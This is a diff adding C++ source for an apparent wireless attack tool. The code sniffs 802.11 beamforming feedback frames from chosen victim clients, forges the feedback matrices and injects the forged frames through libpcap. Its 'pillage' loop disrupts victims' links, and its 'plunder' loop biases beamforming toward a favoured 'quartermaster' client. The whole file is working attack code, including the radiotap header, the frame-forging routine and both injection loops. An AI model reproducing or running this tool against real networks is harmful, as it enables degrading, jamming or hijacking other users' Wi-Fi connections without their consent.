@@ -1,0 +1,343 @@
+#include "injector.h"
+#include <pcap.h>
+#include <cstring>
+#include <cstdio>
+#include <cmath>
+#include <sstream>
+#include <map>
+#include <chrono>
+#include <sys/time.h>
+
+// ---------------------------------------------------------------------------
+// Radiotap header for injected frames
+// Minimal header: version, pad, len, present fields, rate, pad, TX flags
+// Rate 0x6c = 54 Mbps (high MCS for short air time)
+// TX flags 0x0018 = no ACK expected, sequence number injected
+// ---------------------------------------------------------------------------
+static const uint8_t RADIOTAP_HDR[] = {
+    0x00, 0x00,       // version, pad
+    0x0c, 0x00,       // header length = 12 bytes
+    0x04, 0x80,       // present: RATE(bit2) + TX_FLAGS(bit15)
+    0x00, 0x00,
+    0x6c,             // rate: 54 Mbps
+    0x00,             // pad for alignment
+    0x18, 0x00        // TX flags: NOACK | SEQ
+};
+static const int RADIOTAP_HDR_LEN = sizeof(RADIOTAP_HDR);
+
+// ---------------------------------------------------------------------------
+// Helpers
+// ---------------------------------------------------------------------------
+
+static double now_ms() {
+    struct timeval tv;
+    gettimeofday(&tv, NULL);
+    return tv.tv_sec * 1000.0 + tv.tv_usec / 1000.0;
+}
+
+static std::string mac_to_str(const uint8_t* m) {
+    char buf[18];
+    snprintf(buf, sizeof(buf),
+             "%02x:%02x:%02x:%02x:%02x:%02x",
+             m[0], m[1], m[2], m[3], m[4], m[5]);
+    return std::string(buf);
+}
+
+// ---------------------------------------------------------------------------
+// Injector
+// ---------------------------------------------------------------------------
+
+Injector::Injector(const std::string& iface,
+                   const APInfo& ap,
+                   Logger& logger)
+    : iface_(iface), ap_(ap), logger_(logger) {}
+
+Injector::~Injector() {
+    close_handles();
+}
+
+void Injector::stop() {
+    running_ = false;
+}
+
+bool Injector::open_handles(char* errbuf) {
+    sniff_handle_ = pcap_create(iface_.c_str(), errbuf);
+    if (!sniff_handle_) return false;
+
+    pcap_set_snaplen(sniff_handle_, 65535);
+    pcap_set_promisc(sniff_handle_, 1);
+    pcap_set_immediate_mode(sniff_handle_, 1);
+    pcap_set_tstamp_type(sniff_handle_, PCAP_TSTAMP_HOST_HIPREC);
+
+    if (pcap_activate(sniff_handle_) != 0) {
+        pcap_close(sniff_handle_);
+        sniff_handle_ = nullptr;
+        return false;
+    }
+
+    send_handle_ = pcap_open_live(iface_.c_str(), 65535, 1, 0, errbuf);
+    if (!send_handle_) {
+        pcap_close(sniff_handle_);
+        sniff_handle_ = nullptr;
+        return false;
+    }
+
+    return true;
+}
+
+void Injector::close_handles() {
+    if (sniff_handle_) { pcap_close(sniff_handle_); sniff_handle_ = nullptr; }
+    if (send_handle_)  { pcap_close(send_handle_);  send_handle_  = nullptr; }
+}
+
+int Injector::feedback_offset(BFIStandard std) {
+    // Within the 802.11 frame body (after MAC header):
+    // VHT: Category(1) + Action(1) + Dialog Token(1) + VHT MIMO Ctrl(3)
+    //      + Avg SNR field(Nc bytes, variable) -- we skip SNR forgery
+    //      Feedback matrix starts at body offset 6 + Nc
+    //      However we use a fixed offset of 7 which matches the upstream code
+    //      and the standard for 2-stream (Nc=2) VHT feedback.
+    // HE:  Category(1) + Action(1) + Dialog Token(1) + HE MIMO Ctrl(5)
+    //      Feedback matrix starts at body offset 8
+    if (std == BFIStandard::VHT) return 7;
+    return 8; // HE
+}
+
+std::string Injector::build_bpf(const std::vector<ClientInfo>& targets,
+                                  const ClientInfo* qm) {
+    // Capture management action frames from all target MACs
+    // plus NDP announcements from any AP (for timing)
+    std::ostringstream ss;
+    ss << "(type mgt and not (subtype beacon or subtype probe-req "
+       << "or subtype probe-resp or subtype assoc-req or subtype assoc-resp "
+       << "or subtype reassoc-req or subtype reassoc-resp "
+       << "or subtype auth or subtype deauth or subtype disassoc) and (";
+
+    bool first = true;
+    for (const auto& c : targets) {
+        if (!first) ss << " or ";
+        ss << "wlan addr2 " << c.mac;
+        first = false;
+    }
+    if (qm) {
+        if (!first) ss << " or ";
+        ss << "wlan addr2 " << qm->mac;
+    }
+    ss << "))";
+    return ss.str();
+}
+
+bool Injector::inject_forged(const uint8_t* genuine_pkt,
+                              int genuine_len,
+                              const uint8_t* forged_feedback,
+                              int feedback_len,
+                              int feedback_offset_in_frame) {
+    // genuine_pkt starts with radiotap header
+    uint16_t rt_len = genuine_pkt[2] | (genuine_pkt[3] << 8);
+    int mac_offset  = rt_len;
+    int body_offset = mac_offset + 24;
+    int fcs_len     = 4;
+
+    int forged_total = RADIOTAP_HDR_LEN
+                     + (genuine_len - mac_offset - fcs_len);
+
+    std::vector<uint8_t> buf(forged_total, 0);
+
+    // Prepend our radiotap header
+    memcpy(buf.data(), RADIOTAP_HDR, RADIOTAP_HDR_LEN);
+
+    // Copy 802.11 MAC header (24 bytes)
+    memcpy(buf.data() + RADIOTAP_HDR_LEN,
+           genuine_pkt + mac_offset,
+           genuine_len - mac_offset - fcs_len);
+
+    // Set retry bit in frame control byte 1 (bit 3)
+    buf[RADIOTAP_HDR_LEN + 1] |= 0x08;
+
+    // Overwrite feedback matrix bytes in the frame body
+    int fb_start = RADIOTAP_HDR_LEN + 24 + feedback_offset_in_frame;
+    if (fb_start + feedback_len <= forged_total) {
+        memcpy(buf.data() + fb_start, forged_feedback, feedback_len);
+    }
+
+    int res = pcap_inject(send_handle_, buf.data(), forged_total);
+    return res == forged_total;
+}
+
+// ---------------------------------------------------------------------------
+// Pillage attack loop
+// ---------------------------------------------------------------------------
+
+void Injector::run_pillage(const std::vector<ClientInfo>& victims,
+                            const BFIParams& params,
+                            StatsCallback cb) {
+    char errbuf[PCAP_ERRBUF_SIZE];
+    if (!open_handles(errbuf)) {
+        logger_.error(std::string("Failed to open pcap handles: ") + errbuf);
+        return;
+    }
+
+    std::string bpf_str = build_bpf(victims, nullptr);
+    struct bpf_program fp;
+    if (pcap_compile(sniff_handle_, &fp, bpf_str.c_str(), 0,
+                     PCAP_NETMASK_UNKNOWN) == 0) {
+        pcap_setfilter(sniff_handle_, &fp);
+    }
+
+    // Pre-allocate forged feedback buffer
+    std::vector<uint8_t> forged_buf(params.feedback_len);
+
+    // Build MAC->ClientInfo map for fast lookup
+    std::map<std::string, const ClientInfo*> victim_map;
+    for (const auto& v : victims)
+        victim_map[v.mac] = &v;
+
+    running_ = true;
+    int seq   = 0;
+    int fb_off = feedback_offset(params.standard);
+
+    struct pcap_pkthdr* hdr;
+    const uint8_t* pkt;
+
+    while (running_) {
+        int r = pcap_next_ex(sniff_handle_, &hdr, &pkt);
+        if (r != 1) continue;
+
+        uint16_t rt_len = pkt[2] | (pkt[3] << 8);
+        if ((int)hdr->caplen < rt_len + 24) continue;
+
+        const uint8_t* mac_hdr = pkt + rt_len;
+        const uint8_t* ta      = mac_hdr + 10;
+        std::string ta_str     = mac_to_str(ta);
+
+        if (!victim_map.count(ta_str)) continue;
+
+        const uint8_t* body     = mac_hdr + 24;
+        int            body_len = (int)hdr->caplen - rt_len - 24 - 4;
+
+        BFIParams detected;
+        if (!bfi_detect(body, body_len, detected)) continue;
+
+        // Verify parameters match what we detected at startup
+        if (detected.Nr != params.Nr || detected.Nc != params.Nc) continue;
+
+        const uint8_t* fb_bytes = body + fb_off;
+
+        double t0 = now_ms();
+
+        FeedbackMatrix genuine = bfi_decompress(fb_bytes, params);
+        FeedbackMatrix forged  = bfi_forge_disrupt(genuine, params);
+        bfi_compress(forged, params, forged_buf.data());
+
+        bool ok = inject_forged(pkt, (int)hdr->caplen,
+                                forged_buf.data(), params.feedback_len,
+                                fb_off);
+
+        double compute_ms = now_ms() - t0;
+
+        stats_.total_broadsides++;
+        if (ok) stats_.success_count++;
+        else    stats_.fail_count++;
+
+        logger_.log_inject(ta_str, compute_ms, ok, seq++);
+
+        InjectSample sample{ta_str, compute_ms, ok};
+        if (cb) cb({sample});
+    }
+
+    close_handles();
+}
+
+// ---------------------------------------------------------------------------
+// Plunder attack loop
+// ---------------------------------------------------------------------------
+
+void Injector::run_plunder(const std::vector<ClientInfo>& victims,
+                            const ClientInfo& quartermaster,
+                            const BFIParams& params,
+                            StatsCallback cb) {
+    char errbuf[PCAP_ERRBUF_SIZE];
+    if (!open_handles(errbuf)) {
+        logger_.error(std::string("Failed to open pcap handles: ") + errbuf);
+        return;
+    }
+
+    std::string bpf_str = build_bpf(victims, &quartermaster);
+    struct bpf_program fp;
+    if (pcap_compile(sniff_handle_, &fp, bpf_str.c_str(), 0,
+                     PCAP_NETMASK_UNKNOWN) == 0) {
+        pcap_setfilter(sniff_handle_, &fp);
+    }
+
+    std::vector<uint8_t> forged_buf(params.feedback_len);
+
+    std::map<std::string, const ClientInfo*> victim_map;
+    for (const auto& v : victims)
+        victim_map[v.mac] = &v;
+
+    // Store the most recently seen beneficiary feedback matrix
+    FeedbackMatrix qm_matrix;
+    bool qm_ready = false;
+
+    running_ = true;
+    int seq   = 0;
+    int fb_off = feedback_offset(params.standard);
+
+    struct pcap_pkthdr* hdr;
+    const uint8_t* pkt;
+
+    while (running_) {
+        int r = pcap_next_ex(sniff_handle_, &hdr, &pkt);
+        if (r != 1) continue;
+
+        uint16_t rt_len = pkt[2] | (pkt[3] << 8);
+        if ((int)hdr->caplen < rt_len + 24) continue;
+
+        const uint8_t* mac_hdr = pkt + rt_len;
+        const uint8_t* ta      = mac_hdr + 10;
+        std::string ta_str     = mac_to_str(ta);
+
+        const uint8_t* body     = mac_hdr + 24;
+        int            body_len = (int)hdr->caplen - rt_len - 24 - 4;
+
+        BFIParams detected;
+        if (!bfi_detect(body, body_len, detected)) continue;
+        if (detected.Nr != params.Nr || detected.Nc != params.Nc) continue;
+
+        const uint8_t* fb_bytes = body + fb_off;
+
+        // Update quartermaster matrix if this is their BFI
+        if (ta_str == quartermaster.mac) {
+            qm_matrix = bfi_decompress(fb_bytes, params);
+            qm_ready  = true;
+            continue;
+        }
+
+        // Only process victim frames once we have a QM matrix to forge against
+        if (!victim_map.count(ta_str)) continue;
+        if (!qm_ready) continue;
+
+        double t0 = now_ms();
+
+        FeedbackMatrix genuine = bfi_decompress(fb_bytes, params);
+        FeedbackMatrix forged  = bfi_forge_plunder(genuine, qm_matrix, params);
+        bfi_compress(forged, params, forged_buf.data());
+
+        bool ok = inject_forged(pkt, (int)hdr->caplen,
+                                forged_buf.data(), params.feedback_len,
+                                fb_off);
+
+        double compute_ms = now_ms() - t0;
+
+        stats_.total_broadsides++;
+        if (ok) stats_.success_count++;
+        else    stats_.fail_count++;
+
+        logger_.log_inject(ta_str, compute_ms, ok, seq++);
+
+        InjectSample sample{ta_str, compute_ms, ok};
+        if (cb) cb({sample});
+    }
+
+    close_handles();
+}
